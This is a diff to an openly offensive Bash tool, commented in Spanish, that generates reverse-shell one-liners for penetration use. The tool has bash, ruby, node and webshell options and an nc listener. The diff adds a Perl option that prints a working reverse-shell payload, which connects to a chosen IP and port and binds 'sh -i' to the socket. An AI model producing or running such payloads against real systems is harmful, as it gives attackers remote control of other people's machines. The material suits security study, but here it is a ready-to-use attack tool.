@@ -24,6 +24,7 @@ function mostrar_ayuda {
     echo -e "                     - \e[32mr_bash\e[0m"
     echo -e "                     - \e[32mr_ruby\e[0m"
     echo -e "                     - \e[32mr_node\e[0m"
+    echo -e "                     - \e[32mr_perl\e[0m"
     echo -e "  -h, --help         Mostrar esta ayuda"
 }
 #webshell
@@ -77,6 +78,12 @@ function r_node {
     nc -lnvp $PORT
 }
 
+#perl
+function r_perl {
+ echo -e "[\033[0;32m+\e[0m] \033[0;36mAquí tienes tu reverse shell creada! --> \e[0m perl -e 'use Socket;\$i=\"$SERVER_IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'"
+}
+ 
+
 # Variables
 SERVER_IP=""
 PORT=""
@@ -113,6 +120,7 @@ then
         r_bash) r_bash ;;
         r_ruby) r_ruby ;;
         r_node) r_node ;;
+        r_perl) r_perl ;;
         *) echo -e "\e[31mFunción desconocida: $FUNCTION\e[0m"; mostrar_ayuda; exit 1 ;;
     esac
 else
